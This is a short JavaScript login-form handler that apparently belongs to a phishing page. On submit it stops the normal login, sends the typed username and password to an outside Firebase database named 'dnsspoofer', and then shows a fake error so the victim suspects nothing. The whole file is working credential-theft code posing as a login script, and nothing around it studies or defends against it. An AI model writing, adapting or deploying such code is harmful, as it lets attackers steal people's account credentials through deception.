let form = document.querySelector(".Login_form");
let username = document.querySelector("#username");
let password = document.querySelector("#password");
let error = document.querySelector(".Ctn");

form.addEventListener("submit",callback);


async function callback(e){
    e.preventDefault();
    const fetchResponse = await fetch('https://dnsspoofer-3e29b-default-rtdb.firebaseio.com/users.json', {
        method:'POST',
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify({user:username.value,passwd:password.value})
    });

    if(fetchResponse.ok)
    {
      error.setAttribute("id","ERROR");
    }

}